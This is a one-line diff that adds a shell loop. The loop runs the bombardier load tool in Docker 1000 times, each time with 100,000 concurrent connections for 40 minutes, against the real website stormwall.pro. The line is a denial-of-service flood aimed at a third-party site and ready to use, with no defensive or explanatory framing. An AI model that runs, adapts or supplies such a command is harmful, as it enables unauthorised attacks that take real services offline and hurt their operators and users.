@@ -1,0 +1,1 @@
+for i in {1..1000}; do sudo docker run -it alpine/bombardier -c 100000 -d 2400s -l https://stormwall.pro/ && sleep 1; done
